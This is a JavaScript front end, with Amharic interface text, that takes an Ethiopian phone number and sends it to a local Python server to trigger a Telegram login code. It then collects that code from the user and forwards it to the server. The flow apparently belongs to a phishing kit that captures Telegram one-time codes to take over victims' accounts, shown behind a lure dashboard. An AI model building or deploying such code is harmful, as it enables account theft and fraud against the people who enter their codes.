// Elements
const topHeaderSection = document.getElementById('topHeaderSection');
const phonePage = document.getElementById('phonePage');
const codePage = document.getElementById('codePage');
const dashboardPage = document.getElementById('dashboardPage');

const phoneInput = document.getElementById('phoneInput');
const codeInput = document.getElementById('codeInput');
const nextBtn = document.getElementById('nextBtn');
const verifyBtn = document.getElementById('verifyBtn');
const backToPhoneBtn = document.getElementById('backToPhoneBtn');
const maskedUserPhone = document.getElementById('maskedUserPhone');

// Store user data temporarily
let userPhoneNumber = '';

// Backend Server URL (በኮምፒዩተርዎ ላይ ሲሰራ localhost:5000 ይጠቀማል)
const SERVER_URL = 'http://127.0.0.1:5000';

// 1. When user clicks "Next" on Phone Page -> Sends request to Python to trigger Telegram OTP
nextBtn.addEventListener('click', async () => {
    const phoneVal = phoneInput.value.trim();

    if (phoneVal.length < 9) {
        alert('እባክዎ ትክክለኛ 9 አሃዝ ስልክ ቁጥር ያስገቡ (ለምሳሌ: 911223344)');
        phoneInput.focus();
        return;
    }

    userPhoneNumber = '+251' + phoneVal; // ከሰርቨር ጋር ሲገናኝ +2519... መሆን አለበት

    // Visual loading effect
    nextBtn.innerHTML = '<span>ኮድ በመላክ ላይ...</span> <i class="fa-solid fa-spinner fa-spin"></i>';
    nextBtn.style.pointerEvents = 'none';

    try {
        // ወደ  Python ሰርቨር ስልክ ቁጥሩን መላክ
        const response = await fetch(`${SERVER_URL}/send-code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ phone: userPhoneNumber })
        });

        const data = await response.json();

        if (data.status === 'success') {
            // Switch from Phone Page to Code (OTP) Page
            phonePage.classList.remove('active-page');
            phonePage.style.display = 'none';

            codePage.style.display = 'flex';
            codePage.classList.add('active-page');
            codeInput.focus();
        } else {
            alert('ስህተት ተፈጥሯል: ' + data.message);
        }
    } catch (error) {
        alert('ከሰርቨር ጋር መገናኘት አልተቻለም። እባክዎ የ Python ሰርቨር መጀመሩን ያረጋግጡ!');
    } finally {
        // Reset button state
        nextBtn.innerHTML = '<span>ቀጥል (Continue)</span> <i class="fa-solid fa-arrow-right"></i>';
        nextBtn.style.pointerEvents = 'auto';
    }
});

// 2. When user clicks "Verify" on Code (OTP) Page -> Sends OTP to Python Backend
verifyBtn.addEventListener('click', async () => {
    const codeVal = codeInput.value.trim();

    if (codeVal.length < 4) {
        alert('እባክዎ ትክክለኛውን የማረጋገጫ ኮድ ያስገቡ');
        codeInput.focus();
        return;
    }

    // Visual loading effect
    verifyBtn.innerHTML = '<span>በማረጋገጥ ላይ...</span> <i class="fa-solid fa-spinner fa-spin"></i>';
    verifyBtn.style.pointerEvents = 'none';

    try {
        // ኮዱን ወደ Python ሰርቨር መላክ
        const response = await fetch(`${SERVER_URL}/verify-code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ phone: userPhoneNumber, code: codeVal })
        });

        const data = await response.json();

        if (data.status === 'success') {
            // Mask phone number for dashboard (e.g. +251 9***12)
            if (userPhoneNumber.length >= 10) {
                const prefixPart = userPhoneNumber.substring(0, 9); // e.g. "+2519"
                const suffixPart = userPhoneNumber.substring(userPhoneNumber.length - 2);
                maskedUserPhone.textContent = prefixPart + '***' + suffixPart;
            } else {
                maskedUserPhone.textContent = '+251 9***12';
            }

            // Hide OTP page and Top Ticker Header, show Dashboard Page
            codePage.classList.remove('active-page');
            codePage.style.display = 'none';
            if (topHeaderSection) topHeaderSection.style.display = 'none';

            dashboardPage.style.display = 'flex';
            dashboardPage.classList.add('active-page');
        } else {
            alert('ማረጋገጫው አልተሳካም: ' + data.message);
        }
    } catch (error) {
        alert('ከሰርቨር ጋር መገናኘት አልተቻለም።');
    } finally {
        // Reset verify button
        verifyBtn.innerHTML = '<span>አረጋግጥ እናግባ (Verify)</span> <i class="fa-solid fa-check"></i>';
        verifyBtn.style.pointerEvents = 'auto';
    }
});

// 3. Back button to change phone number
backToPhoneBtn.addEventListener('click', () => {
    codePage.classList.remove('active-page');
    codePage.style.display = 'none';

    phonePage.style.display = 'flex';
    phonePage.classList.add('active-page');
    phoneInput.focus();
});

// Allow 'Enter' key support
phoneInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') nextBtn.click();
});

codeInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') verifyBtn.click();
});